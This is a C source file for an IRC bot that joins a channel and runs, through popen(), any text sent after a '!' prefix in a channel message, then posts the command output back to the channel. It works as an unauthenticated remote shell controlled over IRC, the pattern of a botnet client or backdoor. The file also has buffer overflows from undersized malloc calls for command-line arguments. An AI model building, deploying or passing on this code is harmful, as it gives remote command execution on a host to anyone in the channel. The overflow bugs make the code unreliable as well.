#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <pthread.h>

#define MAX_BUF 1024
#define IRC_HOST "localhost"
#define IRC_PORT "6667"
#define IRC_CHANNEL "#mychannel"
#define IRC_NICK "mynick"

struct irc_desc {
	int fd;
	char *ch_name;
	char *nick;
	char *hostname;
	char *port;
};

static int irc_connect(struct irc_desc *desc);
static int irc_send(char *msg, int fd);
static void irc_login(struct irc_desc *desc);
static void *irc_listen(void *arg);
static void *stdin_listen(void *arg);
static int irc_send_priv(char *msg, int fd);

int main(int argc, char* argv[]) {

	int fd_irc;
	void *res;
	char *ch_name = IRC_CHANNEL;
	char *nick = IRC_NICK;
	char *hostname = IRC_HOST;
	char *port = IRC_PORT;
	int opt;
	pthread_t t_irc, t_stdin;

	struct irc_desc *desc = malloc(sizeof(struct irc_desc));

	while((opt = getopt(argc, argv, "h:p:n:c:")) != -1) {
		if (opt == '?')	{
			perror("invalid argument");
			exit(EXIT_FAILURE);
		}

		switch(opt) {
		case 'h':
			hostname = malloc(strlen(optarg) + 1);
			strcpy(hostname, optarg);
			break;
		case 'p':
			port = malloc(strlen(optarg));
			strcpy(port, optarg);
			break;
		case 'n':
			nick = malloc(strlen(optarg));
			strcpy(nick, optarg);
			break;
		case 'c':
			ch_name = malloc(strlen(optarg));
			strcpy(ch_name, optarg);
			break;
		}
	}

	desc->ch_name = ch_name;
	desc->nick = nick;
	desc->hostname = hostname;
	desc->port = port;

	if ((fd_irc = irc_connect(desc)) == -1) {
		perror("cannot connect to IRC");
		exit(EXIT_FAILURE);
	}

	desc->fd = fd_irc;

	irc_login(desc);
	puts("logged into IRC");

	pthread_create(&t_irc, NULL, irc_listen, desc);
	puts("thread irc_listen created");

	pthread_create(&t_stdin, NULL, stdin_listen, desc);
	puts("thread stdin_listen created");

	pthread_join(t_irc, &res);
	pthread_join(t_stdin, &res);

}

static void *stdin_listen(void *arg) {

	struct irc_desc *desc = (struct irc_desc *)arg;
	int fd_irc = desc->fd;
	int num_read;
	char buf[MAX_BUF];

	char *msg = malloc(MAX_BUF + strlen(desc->ch_name) + 3);

	while((num_read = read(STDIN_FILENO, buf, sizeof(buf) - 1)) > 0) {
		snprintf(msg, strlen(desc->ch_name) + num_read + 3, "%s :%s", desc->ch_name, buf);
		irc_send_priv(msg, fd_irc);
	}

	free(msg);

}

static void *irc_listen(void *arg) {

	struct irc_desc *desc = (struct irc_desc *) arg;
	int num_read;
	int aux_space = strlen(desc->ch_name) + strlen("Executing command: ") + 3;
	char buf[MAX_BUF], message[MAX_BUF + aux_space], popen_buf[MAX_BUF + 1];
	char *str_ret;
	FILE *file_popen;

	while((num_read = read(desc->fd, buf, sizeof(buf))) > 0) {
		// set the terminating null byte of string
		buf[num_read] = 0;

		if ((str_ret = strstr(buf, "PRIVMSG")) != NULL) {
			if ((str_ret = strstr(str_ret, ":!")) != NULL) {
				snprintf(message, num_read + aux_space, "%s :Executing command: %s", desc->ch_name, &(str_ret[2]));
				irc_send_priv(message, desc->fd);
				snprintf(message, strlen(str_ret)-3, "%s", (str_ret+2));
				if ((file_popen = popen(message, "r")) == NULL) {
					perror("popen");
					snprintf(message, num_read + aux_space + 6, "%s :ERROR executing command: %s", desc->ch_name, &(str_ret[2]));
					irc_send_priv(message, desc->fd);
					continue;

				} else {

					while(fgets(popen_buf, sizeof(popen_buf), file_popen) != NULL)  {
						snprintf(message, strlen(popen_buf) + strlen(desc->ch_name) + 3, "%s :%s", desc->ch_name, popen_buf);
						irc_send_priv(message, desc->fd);
					}
				}
			}
		} else if ((str_ret = strstr(buf, "PING")) != NULL) {
			snprintf(message, 5, "PONG");
			irc_send(message, desc->fd);
		}
		puts(buf);
	}
}

static void irc_login(struct irc_desc *desc) {
	int ret;

	char *HELLO = "HELLO";
	char *NICK = malloc(strlen(desc->nick) + 6);
	char *USER = "USER bot 0 * :bot";
	char *JOIN = malloc(strlen(desc->ch_name) + 6);

	snprintf(NICK, strlen(desc->nick) + 6, "NICK %s", desc->nick);
	snprintf(JOIN, strlen(desc->ch_name) + 6, "JOIN %s", desc->ch_name);

	if ((ret = irc_send(HELLO, desc->fd)) == -1) {
		perror("sending hello");
		exit(EXIT_FAILURE);
	}
	if ((ret = irc_send(NICK, desc->fd)) == -1) {
		perror("sending nick");
		exit(EXIT_FAILURE);
	}
	if ((ret = irc_send(USER, desc->fd)) == -1) {
		perror("sending user");
		exit(EXIT_FAILURE);
	}
	if ((ret = irc_send(JOIN, desc->fd)) == -1) {
		perror("sending join");
		exit(EXIT_FAILURE);
	}

	free(NICK);
	free(JOIN);

}

static int irc_send_priv(char *msg, int fd) {

	char *PRIVMSG = malloc(strlen(msg) + 9);

	snprintf(PRIVMSG, strlen(msg) + 9, "PRIVMSG %s", msg);

	if (write(fd, PRIVMSG, strlen(PRIVMSG)) == -1) {
		perror("write privmsg irc");
		return -1;
	}

	free(PRIVMSG);
	return 0;
}

static int irc_send(char *msg, int fd) {

	if (write(fd, msg, strlen(msg)) == -1) {
		perror("write irc");
		return -1;
	}

	if (write(fd, "\n", 1) == -1) {
		perror("write new line irc");
		return -1;
	}

	return 0;
}

static int irc_connect(struct irc_desc *desc) {

	int fd_irc;
      	// structures used to get host info, like IP e port
	struct addrinfo hints, *result, *rp;

	// hints is used to filter getaddrinfo response
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_canonname = NULL;
	hints.ai_addr = NULL;
	hints.ai_next = NULL;
	hints.ai_socktype = SOCK_STREAM; // we want TCP
	hints.ai_family = AF_INET; // only IPv4, put AF_INET6 to IPv6 or AF_UNSPEC to get both
	hints.ai_flags = 0;

	// try to find a socket
	if (getaddrinfo(desc->hostname, desc->port, &hints, &result) != 0) {
		perror("getaddrinfo");
		puts("falhou getaddr");
		exit(EXIT_FAILURE);
	}

	// search through responses
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		if ((fd_irc = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) == -1) {
			perror("irc socket");
			// if we can't create a socket with some response, no problem try next
			continue;
		}

		// we've successfuly create a socket, now we need to try to connect
		if (connect(fd_irc, rp->ai_addr, rp->ai_addrlen) == -1) {
			perror("irc connect");
			continue; // again no problem if not works
		}
		break;
	}

	// we must use this convenient method to free all results list
	// (since is a linked list cannot be made with a simple free() )
	freeaddrinfo(result);

	// arrived at last result without successful connection
	if (rp == NULL) {
		close(fd_irc);
		perror("cannot connect to irc");
		return -1;
	}

	return fd_irc;
}
